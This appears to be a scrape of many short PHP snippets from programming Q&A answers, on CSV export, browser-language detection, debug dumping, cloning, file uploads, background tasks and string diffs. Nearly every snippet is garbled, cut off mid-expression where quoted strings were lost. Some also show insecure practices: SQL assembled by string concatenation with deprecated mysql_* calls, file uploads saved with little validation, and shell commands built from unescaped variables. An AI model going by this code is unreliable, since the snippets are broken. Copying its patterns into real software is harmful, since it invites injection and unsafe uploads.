function multipleImageUpload($arrayimage,$dir,$fields,$table) { $allowedExts = array("gif", "jpeg", "jpg", "png"); $temp = explode(".", $arrayimage["name"]); $extension = end($temp); if ((($arrayimage["type"] == "image/gif") || ($arrayimage["type"] == "image/jpeg") || ($arrayimage["type"] == "image/jpg") || ($arrayimage["type"] == "image/pjpeg") || ($arrayimage["type"] == "image/x-png") || ($arrayimage["type"] == "image/png")) && ($arrayimage["size"] < 20000000) && in_array($extension, $allowedExts)) { if ($arrayimage["error"] > 0) { echo "Error: " . $arrayimage["error"] . "<br>"; } else { echo "Upload: " . $arrayimage["name"] . "<br>"; echo "Type: " . $arrayimage["type"] . "<br>"; echo "Size: " . ($arrayimage["size"] / 1024) . " kB<br>"; echo "Stored in: ".$arrayimage[ if (file_exists($dir."/".$arrayimage["name"])) { echo $arrayimage[ } else { foreach($fields as $key=>$val) { $f[]=$key; $v[]=$val; $fi=implode(",",$f); $value=implode(" } $sql="INSERT INTO " . $table ."(".$fi.") VALUES ( $imginsquery=mysql_query($sql); move_uploaded_file($arrayimage["tmp_name"],$dir."/".$arrayimage[ echo "<br> Stored in: " .$dir ."/ Folder <br>"; } } } else { echo "Invalid file"; } } }
function array2csv(array &$array) { if (count($array) == 0) { return null; } ob_start(); $df = fopen("php: fputcsv($df, array_keys(reset($array))); foreach ($array as $row) { fputcsv($df, $row); } fclose($df); return ob_get_clean(); }
function download_send_headers($filename) { $now = gmdate("D, d M Y H:i:s"); header("Expires: Tue, 03 Jul 2001 06:00:00 GMT"); header("Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate"); header("Last-Modified: {$now} GMT"); header("Content-Type: application/force-download"); header("Content-Type: application/octet-stream"); header("Content-Type: application/download"); header("Content-Disposition: attachment;filename={$filename}"); header("Content-Transfer-Encoding: binary"); }
download_send_headers("data_export_" . date("Y-m-d") . ".csv"); echo array2csv($array); die();
<?php $list = array ( array( array( array( ); $fp = fopen( foreach ($list as $fields) { fputcsv($fp, $fields); } fclose($fp); ?>
$values = (array) fetchDataFromEternalOblivion($userId, $limit = 1000); ob_start(); $csv = fopen("php: fputcsv($csv, array_keys(reset($values))); foreach ($values as $row) { fputcsv($csv, $row); } fclose($csv); return ob_get_clean(); $csv = implode(",", array_keys(reset($values))) . PHP_EOL; foreach ($values as $row) { $csv .= } return $csv; $csv = implode(",", array_keys(reset($values))) . PHP_EOL; $i = 1; foreach ($values as $row) { $csv .= $csv .= $csv .= $csv .= $csv .= PHP_EOL; } return $csv;
$result = mysql_query($sql,$conecction); $fp = fopen( while($row = mysql_fetch_assoc($result)){ fputcsv($fp, $row); } fclose($fp);
function setHeader($filename, $filesize) { $now = gmdate("D, d M Y H:i:s"); header("Expires: Tue, 01 Jan 2001 00:00:01 GMT"); header("Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate"); header("Last-Modified: {$now} GMT"); header("Content-Type: application/force-download"); header("Content-Type: application/octet-stream"); header("Content-Type: application/download"); header( if (isset($filename) && strlen($filename) > 0) header("Content-Disposition: attachment;filename={$filename}"); if (isset($filesize)) header("Content-Length: ".$filesize); header("Content-Transfer-Encoding: binary"); header("Connection: close"); } function getSql() { $sql = "SELECT id, date, params, value FROM sometable ORDER BY date;"; return $sql; } function getExportData() { $values = array(); $sql = $this->getSql(); if (strlen($sql) > 0) { $result = dbquery($sql); $fromDb = mysql_fetch_assoc($result); if ($fromDb !== false) { while ($fromDb) { $values[] = $fromDb; $fromDb = mysql_fetch_assoc($result); } } } return $values; } function get() { $values = $this->getExportData(); $csv = tmpfile(); $bFirstRowHeader = true; foreach ($values as $row) { if ($bFirstRowHeader) { fputcsv($csv, array_keys($row)); $bFirstRowHeader = false; } fputcsv($csv, array_values($row)); } rewind($csv); $filename = "export_".date("Y-m-d").".csv"; $fstat = fstat($csv); $this->setHeader($filename, $fstat[ fpassthru($csv); fclose($csv); }
<?php $cycles = 1000000; $a = $b = function compare_two_equals($a, $b) { if ($a == $b) { return TRUE; } else { return FALSE; } } function compare_three_equals($a, $b) { if ($a === $b) { return TRUE; } else { return FALSE; } } $time = microtime(TRUE); for ($count_a = 0; $count_a < $cycles; $count_a++) { compare_two_equals($a, $b); } $time_two_a = microtime(TRUE) - $time; $time = microtime(TRUE); for ($count_a = 0; $count_a < $cycles; $count_a++) { compare_three_equals($a, $b); } $time_three_a = microtime(TRUE) - $time; $time = microtime(TRUE); for ($count_a = 0; $count_a < $cycles; $count_a++) { compare_two_equals($a, $b); } $time_two_b = microtime(TRUE) - $time; $time = microtime(TRUE); for ($count_a = 0; $count_a < $cycles; $count_a++) { compare_three_equals($a, $b); } $time_three_b = microtime(TRUE) - $time; $time = microtime(TRUE); print "<br />\nCOMPARE == (FIRST TRY): " . number_format($time_two_a, 3) . " seconds"; print "<br />\nCOMPARE == (SECOND TRY): " . number_format($time_two_b, 3) . " seconds"; print "<br />\nCOMPARE === (FIRST TRY): " . number_format($time_three_a, 3) . " seconds"; print "<br />\nCOMPARE === (SECOND TRY): " . number_format($time_three_b, 3) . " seconds"; ?>
<?php session_start(); function lixlpixel_get_env_var($Var) { if(empty($GLOBALS[$Var])) { $GLOBALS[$Var]=(!empty($GLOBALS[ $GLOBALS[ } } function lixlpixel_detect_lang() { lixlpixel_get_env_var( lixlpixel_get_env_var( $_AL=strtolower($GLOBALS[ $_UA=strtolower($GLOBALS[ foreach($GLOBALS[ { if(strpos($_AL, $K)===0) return $K; } foreach($GLOBALS[ { if(strpos($_AL, $K)!==false) return $K; } foreach($GLOBALS[ { return $K; } return $GLOBALS[ } $GLOBALS[ $GLOBALS[ ); /* echo echo "<br />"; */ $lang_var = lixlpixel_detect_lang(); /* echo "<br />"; echo $lang_var; echo "<br />"; */ switch ($lang_var){ case "fr": include("index_fr.php"); break; case "it": include("index_it.php"); break; case "en": include("index_en.php"); break; default: include("index_en.php"); break; } ?>
<?php $lang = substr($_SERVER[ $acceptLang = [ $lang = in_array($lang, $acceptLang) ? $lang : require_once "index_{$lang}.php"; ?>
function parseLanguageList($languageList) { if (is_null($languageList)) { if (!isset($_SERVER[ return array(); } $languageList = $_SERVER[ } $languages = array(); $languageRanges = explode( foreach ($languageRanges as $languageRange) { if (preg_match( if (!isset($match[2])) { $match[2] = } else { $match[2] = (string) floatval($match[2]); } if (!isset($languages[$match[2]])) { $languages[$match[2]] = array(); } $languages[$match[2]][] = strtolower($match[1]); } } krsort($languages); return $languages; } function findMatches($accepted, $available) { $matches = array(); $any = false; foreach ($accepted as $acceptedQuality => $acceptedValues) { $acceptedQuality = floatval($acceptedQuality); if ($acceptedQuality === 0.0) continue; foreach ($available as $availableQuality => $availableValues) { $availableQuality = floatval($availableQuality); if ($availableQuality === 0.0) continue; foreach ($acceptedValues as $acceptedValue) { if ($acceptedValue === $any = true; } foreach ($availableValues as $availableValue) { $matchingGrade = matchLanguage($acceptedValue, $availableValue); if ($matchingGrade > 0) { $q = (string) ($acceptedQuality * $availableQuality * $matchingGrade); if (!isset($matches[$q])) { $matches[$q] = array(); } if (!in_array($availableValue, $matches[$q])) { $matches[$q][] = $availableValue; } } } } } } if (count($matches) === 0 && $any) { $matches = $available; } krsort($matches); return $matches; } function matchLanguage($a, $b) { $a = explode( $b = explode( for ($i=0, $n=min(count($a), count($b)); $i<$n; $i++) { if ($a[$i] !== $b[$i]) break; } return $i === 0 ? 0 : (float) $i / count($a); } $accepted = parseLanguageList($_SERVER[ var_dump($accepted); $available = parseLanguageList( var_dump($available); $matches = findMatches($accepted, $available); var_dump($matches);
function prefered_language(array $available_languages, $http_accept_language) { $available_languages = array_flip($available_languages); $langs; preg_match_all( foreach($matches as $match) { list($a, $b) = explode( $value = isset($match[2]) ? (float) $match[2] : 1.0; if(isset($available_languages[$match[1]])) { $langs[$match[1]] = $value; continue; } if(isset($available_languages[$a])) { $langs[$a] = $value - 0.1; } } arsort($langs); return $langs; }
$available_languages = array("en", "zh-cn", "es"); $langs = prefered_language($available_languages, $_SERVER["HTTP_ACCEPT_LANGUAGE"]); /* Result Array ( [en] => 0.8 [es] => 0.4 [zh-cn] => 0.3 )*/
$supportedLanguages = [ ]; $language = http_negotiate_language($supportedLanguages, $result);
$known_langs = array( $user_pref_langs = explode( foreach($user_pref_langs as $idx => $lang) { $lang = substr($lang, 0, 2); if (in_array($lang, $known_langs)) { echo "Preferred language is $lang"; break; } }
function getDefaultLanguage() { if (isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) return parseDefaultLanguage($_SERVER["HTTP_ACCEPT_LANGUAGE"]); else return parseDefaultLanguage(NULL); } function parseDefaultLanguage($http_accept, $deflang = "en") { if(isset($http_accept) && strlen($http_accept) > 1) { $x = explode(",",$http_accept); foreach ($x as $val) { if(preg_match("/(.*);q=([0-1]{0,1}.\d{0,4})/i",$val,$matches)) $lang[$matches[1]] = (float)$matches[2]; else $lang[$val] = 1.0; } $qval = 0.0; foreach ($lang as $key => $value) { if ($value > $qval) { $qval = (float)$value; $deflang = $key; } } } return strtolower($deflang); }
$supported_languages = array("en","nl"); $supported_languages = array_flip($supported_languages); var_dump($supported_languages); $http_accept_language = $_SERVER["HTTP_ACCEPT_LANGUAGE"]; preg_match_all( $available_languages = array(); foreach ($matches as $match) { list($language_code,$language_region) = explode( $priority = isset($match[2]) ? (float) $match[2] : 1.0; $available_languages[][$language_code] = $priority; } var_dump($available_languages); /* array(4) { [0]=> array(1) { ["es"]=> float(1) } [1]=> array(1) { ["nl"]=> float(0.8) } [2]=> array(1) { ["en"]=> float(0.5) } [3]=> array(1) { ["en"]=> float(0.3) } } */ $default_priority = (float) 0; $default_language_code = foreach ($available_languages as $key => $value) { $language_code = key($value); $priority = $value[$language_code]; if ($priority > $default_priority && array_key_exists($language_code,$supported_languages)) { $default_priority = $priority; $default_language_code = $language_code; var_dump($default_priority); var_dump($default_language_code); } } var_dump($default_language_code);
<?php $lang = substr($_SERVER[ $supportedLanguages=[ if(!in_array($lang,$supportedLanguages)){ $lang= } require("index_".$lang.".php");
function lang( $l = [ return $l[ array_keys( $l, substr( explode( $u ?: $_SERVER[ )[0], 0, 2 ) )[0] ] ?: $l[0]; }
$_SERVER[ lang([ lang([ lang([ lang([ lang([ lang([ lang([
<?php $lang = getenv("HTTP_ACCEPT_LANGUAGE"); $set_lang = explode( if (isset($_POST[ { $taal = $_POST[ setcookie("lang", $taal); header( } else { setcookie("lang", $set_lang[0]); echo $set_lang[0]; echo echo $set_lang[1]; header( } ?>
$boolarray = Array(false => echo $boolarray[false];
var_export(true); var_export(false); var_export(1); var_export(0); var_export(null); var_export( var_export(
var_export((bool) true); var_export((bool) false); var_export((bool) 1); var_export((bool) 0); var_export((bool) var_export((bool) var_export((bool) null); var_export((bool) var_export((bool)
echo sprintf("False will print as %b", false); echo sprintf("True will print as %b", true);
echo sprintf("<h1>%s</h1><p>%s<br/>%s</p>", "Neat Headline", "First Line in the paragraph", "My last words before this demo is over");
function dump_condition($condition){ if($condition){ return "true"; } else { return "false"; } }
echo dump_condition(1>0); echo dump_condition(1<0);
<?php class A { public $b; } function set_b($obj) { $obj->b = "after"; } $a = new A(); $a->b = "before"; $c = $a; set_b($a); print $a->b; print $c->b; ?>
class MyClass { private $someObject; public function __construct() { $this->someObject = new SomeClass(); } public function __clone() { $this->someObject = clone $this->someObject; } }
class Foo{ private $run=10; public $foo=array(2,array(2,8)); public function hoo(){return 5;} public function __clone(){ $this->boo=function(){$this->hoo();}; } } $obj=new Foo; $news= clone $obj; var_dump($news->hoo());
class A { public $property; } function set_property($obj) { $obj->property = "after"; var_dump($obj); } $a = new A(); $a->property = "before"; $b = new $a; $c = clone $a; set_property($a); var_dump($a); var_dump($b); var_dump($c); $d = new A(); $d->property = "before"; set_property(clone $d); var_dump($d); ?>
class iPhone { public $name; public $email; public function __construct($n, $e) { $this->name = $n; $this->email = $e; } } $main = new iPhone( $copy = clone $main; echo "<pre>"; print_r($main); echo "</pre>"; echo "<pre>"; print_r($copy); echo "</pre>";
$response = $client->get( $array = $response->json(); var_dump($array[0][
$response = $client->get( $array = json_decode($response->getBody()->getContents(), true); var_dump($array[0][
<?php namespace GuzzleHttp\Psr7; class JsonAwareResponse extends Response { /** * Cache for performance * @var array */ private $json; public function getBody() { if ($this->json) { return $this->json; } $body = parent::getBody(); if (false !== strpos($this->getHeaderLine( return $this->json = \json_decode($body, true); } return $body; } }
<?php $client = new \GuzzleHttp\Client(); /** @var HandlerStack $handler */ $handler = $client->getConfig( $handler->push(\GuzzleHttp\Middleware::mapResponse(function (\Psr\Http\Message\ResponseInterface $response) { return new \GuzzleHttp\Psr7\JsonAwareResponse( $response->getStatusCode(), $response->getHeaders(), $response->getBody(), $response->getProtocolVersion(), $response->getReasonPhrase() ); }),
PHP Notice: Use of undefined constant department - assumed PHP Notice: Use of undefined constant name - assumed PHP Notice: Use of undefined constant email - assumed PHP Notice: Use of undefined constant message - assumed
$department = mysql_real_escape_string($_POST[department]); $name = mysql_real_escape_string($_POST[name]); $email = mysql_real_escape_string($_POST[email]); $message = mysql_real_escape_string($_POST[message]);
$department = mysql_real_escape_string($_POST[ $name = mysql_real_escape_string($_POST[ $email = mysql_real_escape_string($_POST[ $message = mysql_real_escape_string($_POST[
$department = mysql_real_escape_string($_POST[department]); ...(etc)...
$department = mysql_real_escape_string($_POST[ ...(etc)...
class MyClass { const MY_CONST = 123; public function my_method() { return self::MY_CONST; } public function my_method() { return MyClass::MY_CONST; } public function my_bad_method() { return MY_CONST; } }
$department = mysql_real_escape_string($_POST[ $name = mysql_real_escape_string($_POST[ $email = mysql_real_escape_string($_POST[ $message = mysql_real_escape_string($_POST[
$department = mysql_real_escape_string($_POST["department"]); $name = mysql_real_escape_string($_POST["name"]); $email = mysql_real_escape_string($_POST["email"]); $message = mysql_real_escape_string($_POST["message"]);
php /path/to/wwwpublic/path/to/script.php arg1 arg2
<?php $argument1 = $argv[1]; $argument2 = $argv[2]; ?>
<?php if (PHP_SAPI === $argument1 = $argv[1]; $argument2 = $argv[2]; } else { $argument1 = $_GET[ $argument2 = $_GET[ } ?>
<?php if ($_GET) { $argument1 = $_GET[ $argument2 = $_GET[ } else { $argument1 = $argv[1]; $argument2 = $argv[2]; } ?>
$pretty = function($v= echo $pretty($some_variable);
<? function console_dump($value) { ?> <script> console.log(<? echo json_encode($value); ?>); </script> <? } ?>
<pre> <?php $obj = new stdClass; $obj->a=123; $obj->pl=44; $obj->l=array(31,32); $options = array( 2=> 4=> function dump($data, $indent=0) { $retval = $prefix=\str_repeat( if (\is_numeric($data)) $retval.= "Number: $data"; elseif (\is_string($data)) $retval.= "String: elseif (\is_null($data)) $retval.= "NULL"; elseif ($data===true) $retval.= "TRUE"; elseif ($data===false) $retval.= "FALSE"; elseif (is_array($data)) { $retval.= "Array (".count($data). $indent++; foreach($data AS $key => $value) { $retval.= "\n$prefix [$key] = "; $retval.= dump($value, $indent); } } elseif (is_object($data)) { $retval.= "Object (".get_class($data).")"; $indent++; foreach($data AS $key => $value) { $retval.= "\n$prefix $key -> "; $retval.= dump($value, $indent); } } return $retval; } echo dump($options); ?> </pre>
Array (4) [Orchestra] = Array (5) | [1] = String: | [8] = String: | [9] = Object (stdClass) | | a -> Number: 123 | | pl -> Number: 44 | | l -> Array (2) | | | [0] = Number: 31 | | | [1] = Number: 32 | [3] = String: | [16] = String: [2] = String: [4] = String: [TV] = Array (5) | [21] = String: | [215] = String: | [23] = String: | [44] = NULL | [89] = FALSE
public function varToHtml($var= $type = gettype($var); $result = if (in_array($type, array( $result .= ' <table class="debug-table"> <tr> <td class="debug-key-cell"><b> <td class="debug-value-cell"> foreach ($var as $akey => $val) { $result .= sbwDebug::varToHtml($val, $akey); } $result .= } else { $result .= } return $result; }
table.debug-table { padding: 0; margin: 0; font-family: arial,tahoma,helvetica,sans-serif; font-size: 11px; } td.debug-key-cell { vertical-align: top; padding: 3px; border: 1px solid } td.debug-value-cell { vertical-align: top; padding: 3px; border: 1px solid } div.debug-item { border-bottom: 1px dotted } span.debug-label { font-weight: bold; }
function preDump() { $args = func_get_args(); $doEcho = TRUE; $sb; if ($args) { $sb = foreach (func_get_args() as $arg) { if (gettype($arg) == $sb .= switch (gettype($arg)) { case "boolean": case "integer": $sb .= $sb .= json_encode($arg); break; case "string": $sb .= $sb .= $arg; break; default: $sb .= if (is_object($arg)) $sb .= $sb .= if (is_object($arg)) $sb .= $sb .= ob_start(); var_dump($arg); $sb .= ob_get_clean(); if (ob_get_length()) ob_end_clean(); } $sb .= } $sb .= } else { $sb = } if ($doEcho) echo($sb); return $sb; }
<?php if (!defined( if (!function_exists( function preDump() { ... } }
function consoleDump() { $args = func_get_args(); $doEcho = TRUE; $sb; if ($args) { $sb = foreach (func_get_args() as $i => $arg) { if (gettype($arg) == $sb .= switch (gettype($arg)) { case "boolean": case "integer": case "string": $sb .= break; default: $sb .= if (is_object($arg) || is_array($arg)) $sb .= if (is_object($arg)) $sb .= } $sb .= if ($i < count($args)-1) $sb .= } $sb .= } else { $sb = } if ($doEcho) echo($sb); return $sb; }
consoleDump($simpXMLvar, $_SESSION, TRUE, NULL, array( <------------------------------------------------[consoleDump: 6 items]-------------------------------------------------> [Object, Object, Object, Object, Object, Object] 0: Object count: 4 objectClass: "SimpleXMLElement" type: "object" value: Object __proto__: Object <----------------------------------------------------------------------------------------------------------------------->
string : "Test string" boolean : true integer : 17 float : 9.99 array (array) bob : "alice" 1 : 5 2 : 1.4 object (test2) another (test3) string1 : "3d level" string2 : "123" complicated (test4) enough : "Level 4"
function recursive_print ($varname, $varval) { if (! is_array($varval)): print $varname . else: print $varname . " = array();<br>\n"; foreach ($varval as $key => $val): recursive_print ($varname . "[" . var_export($key, true) . "]", $val); endforeach; endif; }
$a = array(); $a[0] = 1; $a[1] = 2; $a[2] = array(); $a[2][0] = $a[2][1] = $a[2][2] =
highlight_string("\n<?" . var_export($var, true) . "?>\n");
<?php /** * Logs messages/variables/data to browser console from within php * * @param $name: message to be shown for optional data/vars * @param $data: variable (scalar/mixed) arrays/objects, etc to be logged * @param $jsEval: whether to apply JS eval() to arrays/objects * * @return none * @author Sarfraz */ function logConsole($name, $data = NULL, $jsEval = FALSE) { if (! $name) return false; $isevaled = false; $type = ($data || gettype($data)) ? if ($jsEval && (is_array($data) || is_object($data))) { $data = $isevaled = true; } else { $data = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES); } $data = $data ? $data : $search_array = array(" $replace_array = array( $data = preg_replace($search_array, $replace_array, $data); $data = ltrim(rtrim($data, $data = $isevaled ? $data : ($data[0] === " $js = <<<JSCODE \n<script> if (! window.console) console = {}; console.log = console.log || function(name, data){}; console.log( console.log( console.log( console.log($data); console.log( console.log( </script> JSCODE; echo $js; }
echo "<pre>"; var_dump($myvariable); echo "</pre>";
exec("doTask.php $arg1 $arg2 $arg3 >/dev/null 2>&1 &");
$socketcon = fsockopen($host, 80, $errno, $errstr, 10); if($socketcon) { $socketdata = "GET $remote_house/script.php?parameters=... HTTP 1.1\r\nHost: $host\r\nConnection: Close\r\n\r\n"; fwrite($socketcon, $socketdata); fclose($socketcon); }
class BackgroundProcess { static function open($exec, $cwd = null) { if (!is_string($cwd)) { $cwd = @getcwd(); } @chdir($cwd); if (strtoupper(substr(PHP_OS, 0, 3)) == $WshShell = new COM("WScript.Shell"); $WshShell->CurrentDirectory = str_replace( $WshShell->Run($exec, 0, false); } else { exec($exec . " > /dev/null 2>&1 &"); } } static function fork($phpScript, $phpExec = null) { $cwd = dirname($phpScript); @putenv("PHP_FORCECLI=true"); if (!is_string($phpExec) || !file_exists($phpExec)) { if (strtoupper(substr(PHP_OS, 0, 3)) == $phpExec = str_replace( if (@file_exists($phpExec)) { BackgroundProcess::open(escapeshellarg($phpExec) . " " . escapeshellarg($phpScript), $cwd); } } else { $phpExec = exec("which php-cli"); if ($phpExec[0] != $phpExec = exec("which php"); } if ($phpExec[0] == BackgroundProcess::open(escapeshellarg($phpExec) . " " . escapeshellarg($phpScript), $cwd); } } } else { if (strtoupper(substr(PHP_OS, 0, 3)) == $phpExec = str_replace( } BackgroundProcess::open(escapeshellarg($phpExec) . " " . escapeshellarg($phpScript), $cwd); } } }
<?php function doCurl($begin) { echo "Do curl<br />\n"; $url = $url = preg_replace( $url .= echo $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); echo curl_close($ch); } if (empty($_GET[ doCurl(1); } else { while (ob_get_level()) ob_end_clean(); header( ignore_user_abort(); ob_start(); echo $size = ob_get_length(); header("Content-Length: $size"); ob_end_flush(); flush(); $begin = $_GET[ $fp = fopen("text.txt", "w"); fprintf($fp, "begin: %d\n", $begin); for ($i = 0; $i < 15; $i++) { sleep(1); fprintf($fp, "i: %d\n", $i); } fclose($fp); if ($begin < 10) doCurl($begin + 1); } ?>
<?php post_async("http: ?> <?php /* * Executes a PHP page asynchronously so the current page does not have to wait for it to finish running. * */ function post_async($url,$params) { $post_string = $params; $parts=parse_url($url); $fp = fsockopen($parts[ isset($parts[ $errno, $errstr, 30); $out = "GET ".$parts[ $out.= "Host: ".$parts[ $out.= "Content-Type: application/x-www-form-urlencoded\r\n"; $out.= "Content-Length: ".strlen($post_string)."\r\n"; $out.= "Connection: Close\r\n\r\n"; fwrite($fp, $out); fclose($fp); } ?>
<?php $stop_date = date( echo $stop_date = date( echo ?>
$stop_date = new DateTime( echo $stop_date->modify( echo
$date = new DateTime( $date->modify( echo $date->format(
$original_date = "2009-09-29"; $time_original = strtotime($original_date); $time_add = $time_original + (3600*24); $new_date = date("Y-m-d", $time_add); echo $new_date;
<?php $testString = "12.322,11T"; echo preg_replace("/[^0-9,.]/", "", $testString); ?>
$numeric_filtered = filter_var("AR3,373.31", FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION | FILTER_FLAG_ALLOW_THOUSAND); echo $numeric_filtered;
$var1 = echo filter_var($var1, FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION | FILTER_FLAG_ALLOW_THOUSAND);
<?php $String1 = $String2 = echo preg_replace( echo preg_replace( ?>
$string = trim($string, "a..zA..Z"); "AR3,373.31" --> "3,373.31" "12.322,11T" --> "12.322,11" "12.322,11" --> "12.322,11"
$unformatted_phone = "phone 122-3222223.ext 442"; echo preg_replace("/[^0-9]/", "", $unformatted_phone);
wamp\bin\php\php5.4.12\php.ini wamp\bin\apache\Apache2.4.4\bin\php.ini
edit -> **C:\wamp\bin\php\php5.4.12\php.ini** ;;uncomment below line or remove the semicolons extension=php_openssl.dll **C:\wamp\bin\apache\Apache2.4.4\bin\php.ini** extension=php_openssl.dll
$relative_path = $_SERVER[ $complete_path = __FILE__; $complete_path = $_SERVER[
ssh user@ip php -i | grep "Loaded Configuration File"
cli_php_ini=php -i | grep /.+/php.ini -oE php_ini="${cli_php_ini/cli/apache2}"
array[1] = "alpha" array[2] = "bravo" array[3] = "charlie" array[8] = "delta" array[9] = "echo"
{% for key,value in array_path %} Key : {{ key }} Value : {{ value }} {% endfor %}
<h1>Members</h1> <ul> {% for key, user in users %} <li>{{ key }}: {{ user.username|e }}</li> {% endfor %} </ul>
{% for key, user in users %} <li>{{ key }}: {{ user.username|e }}</li> {% endfor %}
class Test { private $baz = 1; public function foo() { ... } public function bar() { printf("baz = %d\n", $this->baz); } public static function staticMethod() { echo "static method\n"; } }
class static_test_class { public static function test() { echo "Original class\n"; } public static function run($use_self) { if($use_self) { self::test(); } else { $class = get_called_class(); $class::test(); } } } class extended_static_test_class extends static_test_class { public static function test() { echo "Extended class\n"; } } extended_static_test_class::run(true); extended_static_test_class::run(false);
$class = get_called_class(); $class::function_name();
class Foo { public function fun1() { echo } public static function fun2() { echo (new self)->fun1(); } }
function unicodeString($str, $encoding=null) { if (is_null($encoding)) $encoding = ini_get( return preg_replace_callback( }
function unicodeString($str, $encoding=null) { if (is_null($encoding)) $encoding = ini_get( return preg_replace_callback( return mb_convert_encoding(pack( }, $str); }
<?php echo("\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21"); ?>
$str = utf8_chr( 0x1000 ); $str = utf8_chr( $str = utf8_chr( 4096 );
$htmlEntityChar = "& $realChar = html_entity_decode($htmlEntityChar); $phpChar = "\xE2\x80\x8A"; echo var_dump($realChar === $phpChar);
function str_encode_utf8binary($str) { /** @author Krinkle 2018 */ $output = foreach (str_split($str) as $octet) { $ordInt = ord($octet); $ordHex = base_convert($ordInt, 10, 16); $output .= } return $output; } function str_convert_html_to_utf8binary($str) { return str_encode_utf8binary(html_entity_decode($str)); } function str_convert_json_to_utf8binary($str) { return str_encode_utf8binary(json_decode($str)); } echo str_encode_utf8binary( echo str_convert_html_to_utf8binary( echo str_convert_json_to_utf8binary(
<?php $src = "/home/www/example.com/source/folders/123456"; $dest = "/home/www/example.com/test/123456"; shell_exec("cp -r $src $dest"); echo "<H2>Copy files completed!</H2>"; ?>
<?php $file = $newfile = if(!copy($file,$newfile)) { echo "failed to copy $file"; } else { echo "copied $file into $newfile\n"; } ?>`
$dirPath1 = "users/$uniqueID"; $result = mkdir($dirPath1, 0755); $dirPath2 = "users/$uniqueID/profile"; $result = mkdir($dirPath2, 0755); $dirPath3 = "users/$uniqueID/images"; $result = mkdir($dirPath3, 0755); $dirPath4 = "users/$uniqueID/uploads"; $result = mkdir($dirPath4, 0755); @copy( @copy( @copy( @copy(
$ctx = stream_context_create(array( array( ) )); echo file_get_contents(
$url= $ch=curl_init(); $timeout=5; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); $result=curl_exec($ch); curl_close($ch); echo $result;
$default_socket_timeout = ini_get( .... ini_set( file_get_contents($url); ... ini_set(
; Default timeout for socket based streams (seconds) default_socket_timeout = 300
define( if(apc_exists( if(apc_fetch( apc_clear_cache(); apc_store ( header( exit; } }else{ apc_store ( }
<input id="sortpicture" type="file" name="sortpic" /> <button id="upload">Upload</button>
$(" var file_data = $(" var form_data = new FormData(); form_data.append("file", file_data); alert(form_data); $.ajax({ url: "/uploads", dataType: cache: false, contentType: false, processData: false, data: form_data, type: success: function(){ alert("works"); } }); });
$( var file_data = $( var form_data = new FormData(); form_data.append( alert(form_data); $.ajax({ url: dataType: cache: false, contentType: false, processData: false, data: form_data, type: success: function(php_script_response){ alert(php_script_response); } }); });
<?php if ( 0 < $_FILES[ echo } else { move_uploaded_file($_FILES[ } ?>
var formData = new FormData($(" $.ajax({ url: "upload.php", type: "POST", data : formData, processData: false, contentType: false, beforeSend: function() { }, success: function(data){ }, error: function(xhr, ajaxOptions, thrownError) { console.log(thrownError + "\r\n" + xhr.statusText + "\r\n" + xhr.responseText); } });
<? $data = array(); if (isset($_FILES)) { $error = false; $files = array(); $uploaddir = $target_dir; foreach ($_FILES as $file) { if (move_uploaded_file($file[ $files[] = $uploaddir . $file[ } else { $error = true; } } $data = ($error) ? array( } else { $data = array( } echo json_encode($data); ?>
**1. index.php** <body> <span id="msg" style="color:red"></span><br/> <input type="file" id="photo"><br/> <script type="text/javascript" src="jquery-3.2.1.min.js"></script> <script type="text/javascript"> $(document).ready(function(){ $(document).on( var property = document.getElementById( var image_name = property.name; var image_extension = image_name.split( if(jQuery.inArray(image_extension,[ alert("Invalid image file"); } var form_data = new FormData(); form_data.append("file",property); $.ajax({ url: method: data:form_data, contentType:false, cache:false, processData:false, beforeSend:function(){ $( }, success:function(data){ console.log(data); $( } }); }); }); </script> </body> **2.upload.php** <?php if($_FILES[ $test = explode( $extension = end($test); $name = rand(100,999). $location = move_uploaded_file($_FILES[ echo }
function computeDiff($from, $to) { $diffValues = array(); $diffMask = array(); $dm = array(); $n1 = count($from); $n2 = count($to); for ($j = -1; $j < $n2; $j++) $dm[-1][$j] = 0; for ($i = -1; $i < $n1; $i++) $dm[$i][-1] = 0; for ($i = 0; $i < $n1; $i++) { for ($j = 0; $j < $n2; $j++) { if ($from[$i] == $to[$j]) { $ad = $dm[$i - 1][$j - 1]; $dm[$i][$j] = $ad + 1; } else { $a1 = $dm[$i - 1][$j]; $a2 = $dm[$i][$j - 1]; $dm[$i][$j] = max($a1, $a2); } } } $i = $n1 - 1; $j = $n2 - 1; while (($i > -1) || ($j > -1)) { if ($j > -1) { if ($dm[$i][$j - 1] == $dm[$i][$j]) { $diffValues[] = $to[$j]; $diffMask[] = 1; $j--; continue; } } if ($i > -1) { if ($dm[$i - 1][$j] == $dm[$i][$j]) { $diffValues[] = $from[$i]; $diffMask[] = -1; $i--; continue; } } { $diffValues[] = $from[$i]; $diffMask[] = 0; $i--; $j--; } } $diffValues = array_reverse($diffValues); $diffMask = array_reverse($diffMask); return array( }
function diffline($line1, $line2) { $diff = computeDiff(str_split($line1), str_split($line2)); $diffval = $diff[ $diffmask = $diff[ $n = count($diffval); $pmc = 0; $result = for ($i = 0; $i < $n; $i++) { $mc = $diffmask[$i]; if ($mc != $pmc) { switch ($pmc) { case -1: $result .= case 1: $result .= } switch ($mc) { case -1: $result .= case 1: $result .= } } $result .= $diffval[$i]; $pmc = $mc; } switch ($pmc) { case -1: $result .= case 1: $result .= } return $result; }
S<del>tackO</del><ins>er</ins>ver<del>f</del><ins>Fau</ins>l<del>ow</del><ins>t</ins>
<?php $old_article = file_get_contents( $new_article = $_POST[ $diff = xdiff_string_diff($old_article, $new_article, 1); if (is_string($diff)) { echo "Differences between two articles:\n"; echo $diff; }
